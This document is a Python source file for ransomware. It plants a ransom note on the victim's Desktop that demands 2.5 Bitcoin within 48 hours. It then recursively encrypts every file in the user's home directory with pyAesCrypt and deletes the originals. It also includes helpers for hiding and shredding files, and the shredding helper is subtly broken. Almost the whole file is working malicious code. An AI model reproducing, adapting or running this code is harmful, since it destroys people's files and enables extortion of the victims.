import os
#from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes
import pyAesCrypt
import sys
import ctypes
import glob

password = "your-password of choice albeit a strong one"

_readme = """
The encryption used with this malware is of military grade. What does it mean ?

It will take a supercomputer about 2 x 10^(58) yrs to decrypt it due to its offensively large

Key space. So if you want to proceed with decryption you are on your own, but if you

you want to be on the safe side send 2.5 Bitcoin to the wallet address                       

b7f783baed8297f0db917462184ff4f08e69c2d5e5f79a942600f. You have 48 hours and counting!!

After payment decryption key will be sent to you by sending an anonymous message with 

heading "PAYED" and the body of the message, the ID of the bitcoin transaction to the 

address iamsecure23874@esecure-mailer.com via the mail service 

esecure-mailer@smtp.com
"""

def getHomeDir():
    if(os.name == 'nt'):
        return os.environ['USERPROFILE']
    elif(os.name == 'posix'):
        return os.environ['HOME']

def getSeparator():
    if(os.name == 'nt'):
        return '\\'
    elif(os.name == 'posix'):
        return '/'

def createReadMe(_readmeText):
    f = open('_readme.txt','xt')
    f.write(_readmeText)
    f.close()

def stringZeros(num=0):
    string = b''
    for i in range(num):
        string += bytes('{}'.format(num), encoding='utf-8')

def is_excluded(excluded=[], file=''):
    isExcluded = True
    try:
        excluded.index(file)
    except ValueError:
        isExcluded = False
    return isExcluded


def shred(FileObject,numbytes=0,num_writes=0, overwrite_random=False):
    """
    Before you call this function make sure FileObject is
    opened in binary write mode
    """
    if(FileObject.writable()):
        for num in range(num_writes):
            if(overwrite_random):
                randBytes = get_random_bytes(numbytes)
                FileObject.write(randBytes)
                print(randBytes)
            else:
                FileObject.write(stringZeros(numbytes))
        FileObject.close()
    return None

def HideFile(filenames):
    for filename in filenames:
        filename = os.path.join(os.getcwd(),filename)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        if(os.name == 'nt'):
            kernel32 = ctypes.WinDLL('kernel32',use_last_error=True)
            attrs = kernel32.GetFileAttributesW(filename)
            if(attrs == -1):
                raise ctypes.WinError(ctypes.get_last_error())
            attrs |= FILE_ATTRIBUTE_HIDDEN
            if(not kernel32.SetFileAttributesW(filename,attrs)):
                raise ctypes.WinError(ctypes.get_last_error)
            return filename
        elif(os.name == 'posix'):
            return "." + filename


oldpwd = os.getcwd()
Desktop = os.path.join(getHomeDir(),"Desktop")
os.chdir(Desktop)
try:
    createReadMe(_readme)
except (FileExistsError,PermissionError):
    pass

os.chdir(oldpwd)

def encryptFile(dirname,password):
    bufferSize = 64 * 1024
    curDir = os.getcwd()
    # password1 = input('\n> Enter password to encrypt: ')

    #print('\n> Beginning recursive encryption...\n\n')

    for x in glob.glob('{}\\**\*'.format(dirname), recursive=True):
        try:
            fullpath = os.path.join(curDir, x)
            fullnewf = os.path.join(curDir, x + '.reru')
            if os.path.isfile(fullpath):
                # print('>>> Original: \t' + fullpath + '')
                # print('>>> Encrypted: \t' + fullnewf + '\n')
                pyAesCrypt.encryptFile(fullpath, fullnewf, password, bufferSize)
            os.remove(fullpath)
        except (PermissionError):
            continue
    


#os.chdir(os.path.join(os.getcwd(),"Safe-Folder"))
currDir =  getHomeDir()
encryptFile(dirname=currDir,password=password)
